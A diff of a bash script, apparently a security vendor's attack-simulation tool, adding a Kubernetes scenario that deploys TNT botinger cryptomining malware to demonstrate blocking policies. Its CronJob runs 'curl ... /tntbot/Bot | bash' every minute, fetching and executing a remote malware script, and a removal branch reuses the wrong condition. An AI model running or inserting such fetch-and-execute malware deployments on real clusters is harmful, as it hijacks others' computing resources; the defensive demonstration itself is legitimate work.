@@ -213,7 +213,7 @@ fi
 
 }
 
-#function to deploy log4j and necessary components
+#function to deploy sysrv cryptomining malware and necessary components
 sysrv_deploy() {
 
   ns_val="sysrv-poc"
@@ -621,6 +621,103 @@ eof
   echo
 }
 
+#function to deploy tntbot and necessary components
+tntbot_deploy() {
+
+  ns_val="wordpress-poc"
+
+  if [[ -z $(kubectl get ns | grep $ns_val) ]]
+  then
+      tput bold setaf 2; echo "Creating $ns_val namespace. Please wait..."
+      kubectl create ns $ns_val
+  fi
+
+  echo 
+  tput bold setaf 2; echo "Applying Security Policy. Please wait..."
+  #kubectl -n $ns_val apply -f https://raw.githubusercontent.com/accuknox/samples/main/tntbot/cnp-block-tnt_botinger.yaml
+  kubectl -n $ns_val apply -f https://raw.githubusercontent.com/accuknox/samples/main/tntbot/ksp-block-tnt-botinger.yaml
+  echo
+  tput bold setaf 2; echo "Creating CronJob Please wait..."
+  cat << eof | kubectl -n $ns_val apply -f-
+apiVersion: batch/v1
+kind: CronJob
+metadata:
+  name: cron-tntbot
+spec:
+  schedule: "*/1 * * * *"
+  successfulJobsHistoryLimit: 0
+  failedJobsHistoryLimit: 0
+  jobTemplate:
+    spec:
+      template:
+        metadata:
+          labels:
+           app: wordpress-poc
+        spec:
+          containers:
+          - name: wordpress
+            image: knoxuser/wordpress
+            imagePullPolicy: IfNotPresent
+            command:
+            - /bin/bash
+            - -c 
+            - curl -s https://raw.githubusercontent.com/accuknox/samples/main/tntbot/Bot | bash 
+          restartPolicy: Never
+eof
+
+
+}
+
+
+#function to remove all components deployed during installation phase
+tntbot_remove() {
+
+  ns_val="wordpress-poc"
+
+  tput bold setaf 2; echo "Removing CronJob. Please wait.."
+  echo
+  cat << eof | kubectl -n $ns_val delete -f-
+apiVersion: batch/v1
+kind: CronJob
+metadata:
+  name: cron-tntbot
+spec:
+  schedule: "1 * * * *"
+  successfulJobsHistoryLimit: 0
+  failedJobsHistoryLimit: 0
+  jobTemplate:
+    spec:
+      template:
+        metadata:
+          labels:
+           app: wordpress-poc
+        spec:
+          containers:
+          - name: wordpress
+            image: knoxuser/wordpress
+            imagePullPolicy: IfNotPresent
+            command:
+            - /bin/bash
+            - -c 
+            - sleep 20; curl -s https://raw.githubusercontent.com/accuknox/samples/main/tntbot/Bot | bash 
+          restartPolicy: Never
+eof
+
+  echo 
+  tput bold setaf 2; echo "Removing Security Policy. Please wait..."
+  kubectl -n $ns_val delete -f https://raw.githubusercontent.com/accuknox/samples/main/tntbot/cnp-block-tnt_botinger.yaml
+  kubectl -n $ns_val delete -f https://raw.githubusercontent.com/accuknox/samples/main/tntbot/ksp-block-tnt-botinger.yaml
+
+  echo
+  tput bold setaf 2; echo "Deleting namespace '$ns_val'..."
+  kubectl delete ns $ns_val
+  echo
+
+  echo
+  tput bold setaf 2; echo "Successfully removed all components"
+  echo
+}
+
 if [[ ( $1 == "boutique" ) && ( $2 == "" ) ]]
 then
   boutique_deploy
@@ -635,6 +732,11 @@ then
 
   log4j_deploy
 
+elif [[ ( $1 == "tntbot" ) && ( $2 == "" ) ]]
+then
+
+  tntbot_deploy
+  
 elif [[ ( $1 == "all" ) && ( $2 == "" ) ]]
 then
   echo -e "\n${bold}-------------------------------------------------------\nDeploying boutique-app Scenrio${reset}"
@@ -658,6 +760,11 @@ elif [[ ( $1 == "log4j") && ( $2 == "del" ) ]]
 then
   
   log4j_remove
+  
+elif [[ ( $1 == "log4j") && ( $2 == "del" ) ]]
+then
+  
+  tntbot_remove
 
 elif [[ ( $1 == "all") && ( $2 == "del" ) ]]
 then
@@ -667,7 +774,8 @@ then
   sysrv_remove
   echo -e "\n${bold}-------------------------------------------------------\nDeleting log4j scenrio${reset}"
   log4j_remove
-  
+  echo -e "\n${bold}-------------------------------------------------------\nDeleting tnt-botinger cryptomining scenrio${reset}"
+  tntbot_remove
 else
 
   echo -e "${bold}Use following commands for deploying and deleting.\n$0 boutique/sysrv/log4j/all ---> to deploy\n$0 boutique/sysrv/log4j/all del ---> to delete\nExample:- bash attack.sh boutique or bash attack.sh boutique del${reset}"
